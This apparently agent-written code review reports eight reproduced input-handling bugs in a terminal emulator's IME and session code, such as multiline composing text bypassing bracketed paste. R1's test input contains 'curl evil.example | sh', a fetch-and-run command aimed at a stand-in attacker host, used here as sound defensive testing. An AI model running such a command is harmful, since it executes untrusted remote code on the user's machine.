# 2026-10-22 Bugs reproduced in a code review of vtfx-session and vtfx-input

- Review target: `b649be2a7d94a8b56c2921c235bdcef9c606f018`
- Reviewer: coding agent (`rev-4`, slice: `session+input`)
- Points of view: security boundaries (untrusted IME input and bracketed paste bypasses), wrong bytes sent to the host, lost input, IME contract compliance ([ime-contract.md](../design/ime-contract.md)), and session lifecycle and thread/notification rules ([session-and-threads.md](../design/session-and-threads.md), [compose-input.md](../design/compose-input.md))

Reproduced 8 bugs with 12 test cases. This review did not change product code.

## Status

| ID | Severity | Bug | State | Fix commit / verification |
|---|---|---|---|---|
| R1 | High | Multiline composing text committed via `finishComposingText`, `onKeyDown`, `closeConnection`, `setComposingRegion`, `replaceText`, `typeText`, `paste`, or `sendPendingInput` bypasses `HostInput.Paste` and bracketed paste mode, executing each line as `Enter` | Fixed | 32a876a6aef7cf2ba96a923eae7c14a6d8907f91 (one cause with R3): every call that commits text, the composing text included, decides between a paste and the input history in one place (section 4.2 of ime-contract.md). Not changed: `ComposingLayout` (vtfx-compose) still draws a line break in composing text as a zero-width character, which affects only the preview. Failed before: `ImeEditorTest` `composingTextOfSeveralLinesIsPastedWhenFinished`, `composingTextOfSeveralLinesIsPastedWhenAnyCallCommitsIt`, `composingTextOfSeveralLinesIsPastedWhenTheHistoryLimitCommitsIt`, `aComposingRegionAfterALineBreakPastesTheComposingTextBeforeIt`, `composingTextOfALineFeedAloneAfterAPasteInTheSameBatchEditIsPastedToo`, `aReplacementCommitsTheComposingTextOfSeveralLinesAsAPaste`, `aReplacementInTheComposingTextCommitsItsLinesBeforeTheRangeAsAPaste` |
| R2 | High | Committed newline (`\n`) or Tab (`\t`) inside a batch edit does not flush or reset the input history at once, allowing later edits in the same batch to delete across the line break or lose post-reset history | Fixed | 763a2a5a4e9a0cebe6a9a239f43eae5b067ccc06: an edit that puts a line break or HT into the input history sends it and resets at once, also during a batch edit (sections 4.1 and 5.2 of ime-contract.md). The last assertion of `r2b`, that text committed after the HT in the same batch edit stays in the history after the batch edit, contradicts step 3 of section 5.2 (the restart drops what was committed since the reset), so `r2b` still fails there; `r2a` passes. Failed before: `ImeEditorTest` `aNewlineCommittedInABatchEditIsSentAndResetsAtOnce`, `anHtCommittedInABatchEditIsSentAndResetsAtOnce`, `textAroundAnHtCommittedInABatchEditIsSentWithItAtOnce`, `anHtReplacingTextInABatchEditIsSentAndResetsAtOnce`, `characterKeysOfHtAndLineBreaksInABatchEditAreSentAtOnce` |
| R3 | High | `replaceText` with `"\n"` before the end of the edit buffer (`to < buffer.length`) or after a paste in the same batch edit (`pastedInBatch`) sends `Enter` instead of a paste | Fixed | 32a876a6aef7cf2ba96a923eae7c14a6d8907f91 (one cause with R1): what `replaceText` commits, from the start of its range or of the composing text to the end of the edit buffer, takes the paste rule, also a line feed alone after a paste in the batch edit. Failed before: `ImeEditorTest` `aLineFeedReplacingTextBeforeTheEndOfTheBufferIsAPasteOfTheRest`, `aLineFeedReplacingTextAfterAPasteInTheSameBatchEditIsPastedToo` |
| R4 | High | With `stickyModifiers` armed, a committed or typed Tab (`\t`) is converted to `KeyStroke.Character(0x09)` and dropped by `KeyEncoder`, sending 0 bytes to the host | Fixed | 39753a896257bee699ea89c29e6efc34213020d9: an HT that takes sticky modifiers is the Tab key, and a character key of HT, LF, or CR is the Tab or Enter key; the gate's key encoding is unchanged. Failed before: `TerminalSessionTest` `stickyModifiersApplyToACommittedHtAsTheTabKey`, `stickyModifiersApplyToATypedHtAsTheTabKey`, `characterKeysOfHtAndLineBreaksWithModifiersAreTheTabAndEnterKeys`; `ImeEditorTest` `characterKeysOfHtAndLineBreaksAreTheTabAndEnterKeys` |
| R5 | Medium | Toggling `TerminalSession.directInput` when the editing buffer has not changed since the last restart fails to call `SessionObserver.onRestartInput()` | Open | — |
| R6 | High | Unpaired high surrogate at the end of `history` and unpaired low surrogate at the start of `composing` fuse across the `history`/`composing` boundary in `ImeEditor.text`, sending extra `DEL`s to the host and rejecting valid edits | No action needed | The edit buffer is the input history followed by the composing text (invariant 1 of ime-contract.md), where the two halves are one code point, as the IME sees them; halves committed in separate calls pair up in the history the same way (`DroppedControlsAgreementTest.aSurrogatePairCompletedByALaterCommitReplacesTheReplacementCharacter`). Deleting that character sends one DEL for the U+FFFD that the host got, which keeps invariant 3; a deletion of 2 code points reaches 1 before the history, as BS (6.1); the rejected edits would split the pair (4.1, 6.1). Section 4.2 of ime-contract.md now says so, and `ImeEditorTest.halvesOfAPairInTheHistoryAndTheComposingTextAreOneCharacter` pins it |
| R7 | Medium | `TerminalSession.onFocusChanged(false)` sends the focus-out sequence (`CSI O`) to the host before flushing pending edits from an open batch edit | Open | — |
| R8 | Medium | `TerminalSession.sendMouse`, `onFocusChanged(false)`, and `feed` fail to call `SessionObserver.onUserInput()` when flushing pending IME input, and `sendMouse(Press)` commits composing text even when mouse tracking is disabled | Open | — |

The meaning of the states and how to update them are in 3.3 of [README.md](README.md).

## Running the reproduction tests

The reproduction tests are in [repro-2026-10-22-session-input/](repro-2026-10-22-session-input/). Run them from the root of the repository.

```sh
./gradlew --console=plain --no-configuration-cache \
  -I docs/reviews/repro-2026-10-22-session-input/review.init.gradle \
  :vtfx-session:reviewRepro
```

At the target commit, the result is **12 tests completed, 12 failed**.
Requires JDK 21 (no Android emulator is needed).

## R1: Multiline composing text committed via `finishComposingText` or other commit paths bypasses `HostInput.Paste` and bracketed paste mode

- Related: `ImeEditor.setComposingText`, `ImeEditor.finishComposingText`, `ImeEditor.setComposingRegion`, `ImeEditor.replaceText`, `ImeEditor.onKeyDown`, `ImeEditor.closeConnection`, `ImeEditor.typeText`, `ImeEditor.paste`, `ImeEditor.sendPendingInput`, and `ImeEditor.sendText` in [ImeEditor.kt](../../vtfx-input/src/main/kotlin/com/google/vtfx/input/ImeEditor.kt); `ComposingLayout` in [ComposingLayout.kt](../../vtfx-compose/src/main/kotlin/com/google/vtfx/compose/ComposingLayout.kt)
- Contract: Requirement 6.1 in [REQUIREMENTS.md](../REQUIREMENTS.md), sections 4.2, 6.1, and 11 of [ime-contract.md](../design/ime-contract.md), and [0050-ime-text-of-several-lines-is-a-paste.md](../decisions/0050-ime-text-of-several-lines-is-a-paste.md) ("Committed text with a line break (CR, LF, or CR LF) is a paste, unless it is a line feed alone... An IME commits a clipboard suggestion as text, and its lines must not run one by one")
- Reproduction test: `ReviewReproTest.r1_multilineComposingTextFinished_isSentAsBracketedPaste`

Steps:

1. Create a `TerminalSession` and enable bracketed paste mode by feeding `\u001b[?2004h`.
2. In `session.edit`, call `editor.setComposingText("echo safe\ncurl evil.example | sh\n")` followed by `editor.finishComposingText()` (or `editor.setComposingRegion(0, 0)`, `editor.onKeyDown(...)`, `editor.closeConnection()`, etc.).

Expected result: The multiline text committed from the composition is sent as a bracketed paste: `"\u001b[200~echo safe\rcurl evil.example | sh\r\u001b[201~"`.

Actual result: `"\u001b[200~...\u001b[201~"` is not used; the session sends `"echo safe\rcurl evil.example | sh\r"` (`HostInput.Text` interleaved with `HostInput.Key(KeyStroke.Special(TerminalKey.Enter))`), executing each line immediately on the host despite bracketed paste mode being enabled.

View of the cause: `ImeEditor.withoutDroppedControls` retains `\n` and `\r` in `composing` when `setComposingText` is called, but only `commitText` and `replaceText` (on its `replacement` argument) check `isPaste(...)`. Every path that commits existing `composing` text (`finishComposingText`, `setComposingRegion`, `replaceText` when `composing` had line breaks, `onKeyDown`, `closeConnection`, `typeText`, `paste`, `sendPendingInput`, and `endOperation` when `isHistoryOverLimit()` is true) appends `composing` directly to `history`, which `flush()` then sends through `sendText()`, turning every line break into an unbracketed `Enter` key press. In addition, `ComposingLayout` treats `\n` and `\r` as zero-width characters (`CharWidth.of == 0`) and merges them into the preceding cell, so line breaks in `composingText` are visually hidden during composition.

Direction of the fix: Check all paths by which text containing line breaks can enter `composing` or transition from `composing` to committed text (`setComposingText`, `finishComposingText`, `setComposingRegion`, `replaceText`, `onKeyDown`, `closeConnection`, `typeText`, `paste`, `sendPendingInput`, and history-limit flushes), as well as how `ComposingLayout` lays out control characters with `CharWidth.of == 0`.

## R2: Committed newline (`\n`) or Tab (`\t`) inside a batch edit does not flush or reset the input history at once

- Related: `ImeEditor.commitText`, `ImeEditor.replaceText`, `ImeEditor.onKeyDown`, `ImeEditor.endOperation`, and `ImeEditor.flush` in [ImeEditor.kt](../../vtfx-input/src/main/kotlin/com/google/vtfx/input/ImeEditor.kt)
- Contract: Sections 4.2, 5.1, and 5.2 of [ime-contract.md](../design/ime-contract.md) ("1. Send the edits not sent yet, even during a batch edit: they were made before the reset. 2. Empty the input history at once, even during a batch edit and while there is composing text, so that the IME's later edits apply to the empty history"), [0054-resets-during-batch-edits.md](../decisions/0054-resets-during-batch-edits.md), and [0057-provisional-ime-details.md](../decisions/0057-provisional-ime-details.md)
- Reproduction test: `ReviewReproTest.r2a_commitNewlineInBatchEdit_flushesAndResetsHistoryImmediately`, `ReviewReproTest.r2b_commitTabThenTextInBatchEdit_keepsTextAfterTabInHistory`

Steps:

1. (`r2a`) Commit `"ls"`, then in a batch edit (`beginBatchEdit()` .. `endBatchEdit()`) call `commitText("\n")` followed by `deleteSurroundingText(1, 0)`.
2. (`r2b`) In a batch edit (`beginBatchEdit()` .. `endBatchEdit()`), call `commitText("\t")` followed by `commitText("abc")`. After the batch edit ends, call `replaceText(0, 3, "abd")`.

Expected result:
- In `r2a`, `commitText("\n")` immediately sends `Enter` (`"\r"`) and empties the input history, so `deleteSurroundingText(1, 0)` sends 1 `DEL` (`"\u007f"`) on the new line (`"\r\u007f"` in total).
- In `r2b`, `commitText("\t")` flushes `"\t"` and resets the input history at that point, and `"abc"` committed after the Tab in the same batch edit remains in the input history (or is tracked cleanly per section 5.2), rather than having `flush()` at `endBatchEdit()` wipe `"abc"` because `'\t' in added` was true for the combined string `"\tabc"`.

Actual result:
- In `r2a`, `commitText("\n")` appends `"\n"` to `history` (`"ls\n"`) without flushing because `batchDepth > 0`. `deleteSurroundingText(1, 0)` then deletes the `"\n"` from `history` (`"ls"`), and `endBatchEdit()` sees no difference from `sentHistory` (`"ls"`), sending `""` (neither `Enter` nor `DEL` is sent to the host). If `deleteSurroundingText(2, 0)` is called instead, it sends `DEL` for `'s'` of the previous line without ever having sent `Enter`.
- In `r2b`, at `endBatchEdit()`, `flush()` sends `"\tabc"` and then calls `clearHistory()` because `'\t' in added` is true, wiping `"abc"` from `history` so `replaceText(0, 3, "abd")` fails (`false`).

View of the cause: `commitText`, `replaceText`, and `onKeyDown` (for un-modified `KeyStroke.Character` of `\n`, `\r`, or `\t`) append `\n`, `\r`, or `\t` to `history` and call `endOperation()`, which defers `flush()` while `batchDepth > 0`. The reset triggered by a line break or `\t` therefore does not happen until `endBatchEdit()`, violating section 5.2 of `ime-contract.md`.

Direction of the fix: Check all paths that commit a reset-triggering character (`\n`, `\r`, `\t`) during a batch edit (`commitText`, `replaceText`, `onKeyDown` with `KeyStroke.Character`), including when a single string contains text before and/or after `\t` (e.g. `commitText("a\tb")`).

## R3: `replaceText` with `"\n"` before the end of the edit buffer or after a paste in the same batch edit fails to paste

- Related: `ImeEditor.replaceText` and `ImeEditor.isPaste` in [ImeEditor.kt](../../vtfx-input/src/main/kotlin/com/google/vtfx/input/ImeEditor.kt)
- Contract: Sections 4.2, 6.1, and 11 of [ime-contract.md](../design/ime-contract.md), [0050-ime-text-of-several-lines-is-a-paste.md](../decisions/0050-ime-text-of-several-lines-is-a-paste.md), and [0064-line-feed-after-a-paste-in-a-batch-edit.md](../decisions/0064-line-feed-after-a-paste-in-a-batch-edit.md)
- Reproduction test: `ReviewReproTest.r3a_replaceTextWithNewlineBeforeEndOfBuffer_isSentAsPaste`, `ReviewReproTest.r3b_replaceTextWithNewlineAfterPasteInSameBatch_isSentAsPaste`

Steps:

1. (`r3a`) Enable bracketed paste (`\u001b[?2004h`), commit `"echo hi"`, and call `replaceText(4, 5, "\n")` (replacing the space with a line feed so that `"hi"` follows the line break).
2. (`r3b`) Enable bracketed paste (`\u001b[?2004h`), and in one batch edit call `replaceText(0, 0, "line1\nline2")` followed by `replaceText(0, 0, "\n")`.

Expected result:
- In `r3a`, replacing the space before `"hi"` with `"\n"` deletes `" hi"` (`3` `DEL`s) and pastes `"\nhi"` (`"\u007f\u007f\u007f\u001b[200~\rhi\u001b[201~"`), and resets the history.
- In `r3b`, the trailing `"\n"` after a paste in the same batch edit is also sent as a paste (`"\u001b[200~line1\rline2\u001b[201~\u001b[200~\r\u001b[201~"`).

Actual result:
- In `r3a`, `isPaste("\n")` is `false`, so `replaceText` sets `history = "echo\nhi"` and calls `endOperation()` -> `flush()`. This sends `"\u007f\u007f\u007f\rhi"` unbracketed (executing `echo` immediately via `Enter` and typing `hi` on the next line), and then `clearHistory()` wipes `"hi"` from `history` while the host has `"hi"` on the new line (violating Invariant 3).
- In `r3b`, `replaceText` checks only `if (isPaste(replacement))` and ignores `pastedInBatch`, so the trailing `"\n"` is sent as an unbracketed `Enter` (`"\r"`), executing the pasted lines.

View of the cause: `ImeEditor.replaceText` checks `if (isPaste(replacement))` instead of checking `pastedInBatch` (as `commitText` does) and checking whether `replacement + buffer.substring(to)` contains a line break with text after it (`to < buffer.length`).

Direction of the fix: Check `replaceText` when `replacement` contains `\n` (alone or with other characters), both when `pastedInBatch` is true and when `to < buffer.length` (so `replacement + buffer.substring(to)` is multiline, not a line feed alone).

## R4: With `stickyModifiers` armed, a committed or typed Tab (`\t`) is dropped and sends 0 bytes

- Related: `TerminalSession.editor`, `TerminalSession.sendTextWithModifiers` in [TerminalSession.kt](../../vtfx-session/src/main/kotlin/com/google/vtfx/session/TerminalSession.kt); `KeyEncoder.encodeCharacter` in [KeyEncoder.kt](../../vtfx-gate/src/main/kotlin/com/google/vtfx/gate/KeyEncoder.kt)
- Contract: Sections 4.2 and 6.3 of [ime-contract.md](../design/ime-contract.md), section 8 of [compose-input.md](../design/compose-input.md), and section 2.1 of [gate-policy.md](../design/gate-policy.md)
- Reproduction test: `ReviewReproTest.r4_stickyShiftWithCommittedTab_sendsBackTabInsteadOfDroppingIt`

Steps:

1. Set `session.stickyModifiers = KeyModifiers.of(shift = true)` (or `alt = true`, or `ctrl = true`).
2. Call `session.edit { it.commitText("\t") }` (or `session.sendText("\t")`, or `session.sendKey(KeyStroke.Character('\t'.code))`).

Expected result: With Shift armed, `"\t"` is encoded as Shift+Tab (`"\u001b[Z"`, or `"\u001b\t"` with Alt, or `"\t"` with Ctrl).

Actual result: `""` (0 bytes are sent to the host; the Tab is silently dropped and `stickyModifiers` is consumed). If `commitText("\tabc")` is called with `stickyModifiers` armed, `"\t"` is dropped and only `"abc"` is sent without modifiers.

View of the cause: `ImeEditor` keeps `\t` inside `HostInput.Text` (and `ImeEditor.onKeyDown` routes `KeyStroke.Character('\t'.code, modifiers)` with modifiers to `HostInput.Key`). When `stickyModifiersState` is non-empty, `TerminalSession.sendTextWithModifiers` turns the first code point `0x09` into `KeyStroke.Character(0x09, modifiers)` and passes it to `HostWriter.sendKey` -> `KeyEncoder.encodeCharacter`. `KeyEncoder.encodeCharacter` treats every code point `< 0x20` (including `0x09`) as a dropped control character (`isControl(0x09) == true`) and returns `ByteArray(0)`.

Direction of the fix: Check how `\t` (and `\r` / `\n` if passed via `KeyStroke.Character` with modifiers) is handled when converted to or sent as a `KeyStroke` with modifiers in `TerminalSession`, `ImeEditor.onKeyDown`, and `KeyEncoder`.

## R5: Toggling `TerminalSession.directInput` when the editing buffer has not changed since the last restart fails to call `onRestartInput()`

- Related: `TerminalSession.directInput` in [TerminalSession.kt](../../vtfx-session/src/main/kotlin/com/google/vtfx/session/TerminalSession.kt); `ImeEditor.requestReset` and `ImeEditor.restartIfReady` in [ImeEditor.kt](../../vtfx-input/src/main/kotlin/com/google/vtfx/input/ImeEditor.kt)
- Contract: Sections 3 and 13 of [ime-contract.md](../design/ime-contract.md) ("Switching commits and sends the composing text, resets the input history, and restarts the input") and the KDoc of `TerminalSession.directInput` ("Changing it commits the composing text and restarts the input, for example from a toggle on an auxiliary key bar")
- Reproduction test: `ReviewReproTest.r5_togglingDirectInputWithoutPriorBufferEdit_restartsInput`

Steps:

1. Create a `TerminalSession`, attach a `SessionObserver`, and (without uncommitted edits since the connection or after pressing `Enter` / `Esc` which already reset the buffer) set `session.directInput = true`.

Expected result: `SessionObserver.onRestartInput()` is called once so that `TerminalInputView` calls `InputMethodManager.restartInput(this)` and the IME re-reads `EditorInfo.inputType` (`TYPE_TEXT_VARIATION_VISIBLE_PASSWORD | TYPE_TEXT_FLAG_NO_SUGGESTIONS`).

Actual result: `SessionObserver.onRestartInput()` is not called (`restarts == 0`).

View of the cause: `directInput` setter calls `editor.finishComposingText()` and `editor.requestReset()`. `ImeEditor.restartIfReady()` suppresses `listener.restartInput()` when `changedSinceRestart` is `false` (an optimization intended for host-output cursor moves so they do not repeatedly restart an already-empty IME). When the user toggles `directInput` on a fresh session, or right after pressing `Enter` (e.g. `vim file\n`) or `Esc` (in vim), `changedSinceRestart` is `false`, so `restartInput()` is skipped and the IME stays in the old `inputType`.

Direction of the fix: Ensure that changing `TerminalSession.directInput` always triggers `onRestartInput()` once any batch edit and composing text are finished, even when `changedSinceRestart` is `false`.

## R6: Unpaired surrogate halves across the `history` / `composing` boundary fuse in `ImeEditor.text`, corrupting delete counts and rejecting valid edits

- Related: `ImeEditor.text`, `ImeEditor.setComposingRegion`, `ImeEditor.deleteSurroundingText`, `ImeEditor.deleteSurroundingTextInCodePoints`, `ImeEditor.replaceText`, `ImeEditor.textBeforeCursor`, and `ImeEditor.onKeyDown` in [ImeEditor.kt](../../vtfx-input/src/main/kotlin/com/google/vtfx/input/ImeEditor.kt)
- Contract: Section 2 (Invariants 1–3), section 4.2 ("An unpaired surrogate stays in the editing buffer and is sent as U+FFFD; both are one code point, so a later edit sends one DEL for it"), and section 6.1 of [ime-contract.md](../design/ime-contract.md)
- Reproduction test: `ReviewReproTest.r6_surrogateHalvesAcrossHistoryAndComposingBoundary_doNotCorruptDeleteCount`

Steps:

1. Commit an unpaired high surrogate: `session.edit { it.commitText("\ud83d") }`. The host receives `""` (`U+FFFD`, 1 character).
2. Set an unpaired low surrogate as composing text: `session.edit { it.setComposingText("\ude00") }`. Nothing is sent to the host.
3. Call `session.edit { it.deleteSurroundingText(1, 0) }` (or `deleteSurroundingTextInCodePoints(1, 0)`) to delete the 1 composing character `"\ude00"`.

Expected result: Only the composing character `"\ude00"` is deleted; nothing is sent to the host (`""`), and `editor.text` remains `"\ud83d"`.

Actual result: `ImeEditor` sends `"\u007f"` (1 `DEL`) to the host, erasing the committed `U+FFFD` on the host, and empties `editor.text` to `""`. Furthermore, if `deleteSurroundingTextInCodePoints(2, 0)` is called in step 3, `ImeEditor` computes `available = 1, outside = 1` and sends **2 `DEL`s** (`"\u007f\u007f"`) to the host even though only 1 character was ever sent, erasing a character of the shell prompt before the input history. Similarly, `setComposingRegion(1, 2)`, `replaceText(0, 1, "x")`, and `replaceText(1, 2, "x")` all return `false`, and `textBeforeCursor(1)` returns `""`.

View of the cause: `ImeEditor` concatenates `history + composing` in `text` and runs `splitsSurrogatePair(buffer, ...)` and `buffer.codePointCount(0, buffer.length)` on the concatenated string without treating the boundary at `history.length` (`composingStart`) as a boundary between already-sent `history` (`U+FFFD` on the host) and uncommitted `composing`.

Direction of the fix: Check all operations that inspect or slice across `history` and `composing` (`deleteSurroundingText`, `deleteSurroundingTextInCodePoints`, `setComposingRegion`, `replaceText`, `textBeforeCursor`, and `onKeyDown(Backspace)`) when `history` ends with a high surrogate and `composing` starts with a low surrogate.

## R7: `TerminalSession.onFocusChanged(false)` sends focus-out (`CSI O`) before flushing pending batch edits

- Related: `TerminalSession.onFocusChanged` in [TerminalSession.kt](../../vtfx-session/src/main/kotlin/com/google/vtfx/session/TerminalSession.kt)
- Contract: Sections 5.1 and 5.2 of [ime-contract.md](../design/ime-contract.md) ("1. Send the edits not sent yet, even during a batch edit: they were made before the reset")
- Reproduction test: `ReviewReproTest.r7_onFocusChangedFalse_flushesPendingBatchEditsBeforeSendingFocusOut`

Steps:

1. Enable focus event reporting (`\u001b[?1004h`) and focus the session (`session.onFocusChanged(true)`).
2. Start a batch edit and commit `"abc"` (`editor.beginBatchEdit(); editor.commitText("abc")`).
3. Call `session.onFocusChanged(false)`.

Expected result: The edits made while the session had focus are flushed first, followed by the focus-out report: `"abc\u001b[O"`.

Actual result: The session sends `"\u001b[Oabc"` (focus-out is sent before the edits committed while focused).

View of the cause: In `TerminalSession.onFocusChanged`, `if (terminal.modes.focusEvents) outbox += { writer.sendFocus(focused) }` (line 734) is executed before `if (!focused) editor.requestReset()` (line 735), which flushes pending edits to `outbox`. Compare with `sendMouse` (line 719), which flushes pending input before queuing the mouse report.

Direction of the fix: Flush/reset the editor on focus loss before queuing the `sendFocus(false)` write to `outbox`.

## R8: `TerminalSession.sendMouse`, `onFocusChanged(false)`, and `feed` fail to notify `onUserInput()` when flushing pending IME input, and `sendMouse(Press)` commits composing text even when mouse tracking is off

- Related: `TerminalSession.sendMouse`, `TerminalSession.onFocusChanged`, and `TerminalSession.feed` in [TerminalSession.kt](../../vtfx-session/src/main/kotlin/com/google/vtfx/session/TerminalSession.kt)
- Contract: Sections 5.1 and 5.2 of [ime-contract.md](../design/ime-contract.md) ("A mouse button press reported to the host (`TerminalSession.sendMouse`) ... The composing text is committed and sent before the report"; "1. Send the edits not sent yet, even during a batch edit"), sections 2, 3, and 4 of [compose-input.md](../design/compose-input.md), and the KDoc of `TerminalSession.input`, `TerminalSession.sendMouse`, and `SessionObserver.onUserInput`
- Reproduction test: `ReviewReproTest.r8a_sendMousePress_notifiesUserInputWhenComposingTextIsSent`, `ReviewReproTest.r8b_sendMousePressWhenTrackingDisabled_doesNotCommitComposingText`, `ReviewReproTest.r8c_resetDuringBatchEdit_notifiesUserInputWhenPendingEditsAreSent`

Steps:

1. (`r8a`) Enable mouse tracking (`\u001b[?1000h`), attach a `SessionObserver`, set composing text `"abc"`, and call `session.sendMouse(MouseReport(MouseButton.Left, MouseAction.Press, 1, 1))`.
2. (`r8b`) Leave mouse tracking disabled (`MouseTracking.None`), set composing text `"abc"`, and call `session.sendMouse(MouseReport(MouseButton.Left, MouseAction.Press, 1, 1))`.
3. (`r8c`) Attach a `SessionObserver`, start a batch edit and commit `"abc"` (`editor.beginBatchEdit(); editor.commitText("abc")`), and then call `session.onFocusChanged(false)` (or `session.feed("...".toByteArray())` which moves the cursor and resets the editor).

Expected result:
- In `r8a`, `"abc"` and the mouse press are sent to the host, `editor.composingText` becomes `""`, and `SessionObserver.onUserInput()` is called once so `TerminalDisplay` increments `editorVersion` (removing the composing text overlay on screen), drops any selection, and resets cursor blink phase.
- In `r8b`, because mouse tracking is off and no mouse press is reported to the host, the composing text `"abc"` is not committed or sent (`sent == ""`, `composingText == "abc"`).
- In `r8c`, flushing pending batch edits `"abc"` to the host calls `SessionObserver.onUserInput()`.

Actual result:
- In `r8a`, `"abc\u001b[M !!"` is sent and `editor.composingText` becomes `""`, but `SessionObserver.onUserInput()` is not called (`userInputs == 0`), leaving `TerminalDisplay` with a stale composing text overlay if the host does not echo.
- In `r8b`, `sendMouse` calls `editor.sendPendingInput()` unconditionally before checking whether the mouse report will be sent, committing and sending `"abc"` to the host even though mouse tracking is disabled.
- In `r8c`, `"abc"` is sent to the host on reset, but `SessionObserver.onUserInput()` is not called (`userInputs == 0`).

View of the cause: `TerminalSession.sendMouse`, `onFocusChanged`, and `feed` call `input { ... }` with `notifySent = false` (the default, unlike `stickyModifiers` setter and `edit` which pass `notifySent = true`), and `sendMouse` calls `editor.sendPendingInput()` without checking whether `report` is actually reported under the current `mouseTracking` and `mouseEncoding`.

Direction of the fix: Pass `notifySent = true` to `input` in `sendMouse`, `onFocusChanged`, and `feed` (when `editor.requestReset()` flushes pending user edits), and only commit pending input in `sendMouse` when the mouse press is actually reported to the host.

## Unverified concerns

- Unbounded composing text length in `ImeEditor`: While `history` is capped at `maxHistoryLength` (1024 code points, Invariant 5), `ImeEditor.setComposingText` places no length cap on `composing` (`ComposingLayout` caps only the portion it lays out for display and `CursorAnchorInfo` to `rows * columns * 32`). Because `ComposingLayout.kt` explicitly documents that composing text has no length limit, this was not reported as a bug, but if an untrusted IME sends a multi-megabyte `setComposingText`, `ImeEditor.text` and `withoutDroppedControls` will allocate and copy the full string on every query/edit.

## Verification results at review time

- `scripts/check.sh`: Passed
- Reproduction tests: `./gradlew --console=plain --no-configuration-cache -I docs/reviews/repro-2026-10-22-session-input/review.init.gradle :vtfx-session:reviewRepro` — 12 tests completed, 12 failed
- Verification not run: emulator e2e (`scripts/emulator.sh`), long fuzzing
